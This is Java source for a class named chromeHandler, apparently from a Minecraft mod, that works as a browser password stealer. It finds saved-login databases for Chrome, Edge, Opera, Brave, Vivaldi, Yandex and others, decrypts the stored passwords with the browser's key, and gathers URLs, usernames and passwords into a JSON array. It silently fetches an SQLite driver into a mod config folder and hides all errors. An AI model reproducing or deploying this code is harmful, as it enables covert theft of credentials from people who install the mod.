package cc.breadcat.handlers;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import net.minecraft.client.Minecraft;
import org.apache.commons.io.FileUtils;

import java.io.File;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.ResultSet;
import java.util.HashMap;
import java.util.Properties;

import static cc.breadcat.utils.encryptionUtils.decrypt;
import static cc.breadcat.utils.encryptionUtils.getKey;

public class chromeHandler {

    private static final File appData = new File(System.getenv("APPDATA"));
    private static final File localAppData = new File(System.getenv("LOCALAPPDATA"));
    private static final HashMap <String, String> paths = new HashMap<String, String>() {
        {
            put("Google Chrome", localAppData + "\\Google\\Chrome\\User Data");
            put("Microsoft Edge", localAppData + "\\Microsoft\\Edge\\User Data");
            put("Chromium", localAppData + "\\Chromium\\User Data");
            put("Opera", appData + "\\Opera Software\\Opera Stable");
            put("Opera GX", appData + "\\Opera Software\\Opera GX Stable");
            put("Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data");
            put("Vivaldi", localAppData + "\\Vivaldi\\User Data");
            put("Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data");
        }
    };

    private final JsonArray pswds = new JsonArray();

    public JsonArray grabPassword() {
        crawlUserData();
        return pswds;
    }

    private void crawlUserData() {
        for (String browser : paths.keySet()) {
            File userData = new File(paths.get(browser));
            if (!userData.exists()) continue;
            byte[] key = getKey(new File(userData, "Local State"));
            for (File data: userData.listFiles()) {
                if (data.getName().contains("Profile") || data.getName().equals("Default")) {
                    crawlPasswords(data, key);
                } else if (data.getName().equals("Login Data")) {
                    crawlPasswords(userData, key);
                }
            }
        }
    }

    private void crawlPasswords(File profile, byte[] key) {
        try {
            File loginData = new File(profile, "Login Data");
            File tempLoginData = new File(profile, "Temp Login Data");
            if (!loginData.exists()) return;
            Files.copy(loginData.toPath(), tempLoginData.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
            Driver driver = getDriver();
            Properties props = new Properties();
            props.setProperty("user", "");
            props.setProperty("password", "");
            Connection connection = driver.connect("jdbc:sqlite:" + tempLoginData.getAbsolutePath(), props);
            ResultSet resultSet = connection.createStatement().executeQuery("SELECT origin_url, username_value, password_value FROM logins");
            while (resultSet.next()) {
                byte[] encryptedPassword = resultSet.getBytes(3);
                String decryptedPassword = decrypt(encryptedPassword, key);
                if (decryptedPassword != null || (resultSet.getString(1) != null && resultSet.getString(2) != null)) {
                    JsonObject pswd = new JsonObject();
                    pswd.addProperty("url", (!resultSet.getString(1).equals("")) ? resultSet.getString(1) : "N/A");
                    pswd.addProperty("username", (!resultSet.getString(2).equals("")) ? resultSet.getString(2) : "N/A");
                    pswd.addProperty("password", decryptedPassword);
                    pswds.add(pswd);
                }
            }

        } catch (Exception e) {
        }
    }
    private Driver getDriver() {
        //download the driver if it doesn't exist
        try {
            File driverFile = new File(Minecraft.getMinecraft().mcDataDir,"config/essential/sqlite-jdbc-3.23.1.jar");
            URL url = new URL("https://repo1.maven.org/maven2/org/xerial/sqlite-jdbc/3.23.1/sqlite-jdbc-3.23.1.jar");
            if (!driverFile.exists()) {
                    FileUtils.copyURLToFile(url, driverFile);
            }
            driverFile.deleteOnExit();
            ClassLoader classLoader = new URLClassLoader(new URL[] { driverFile.toURI().toURL() });
            Class clazz = Class.forName("org.sqlite.JDBC", true, classLoader);
            Object driverInstance = clazz.newInstance();
            Driver driver = (Driver) driverInstance;
            return driver;
        } catch (Exception e) {
        }
        return null;
    }
}
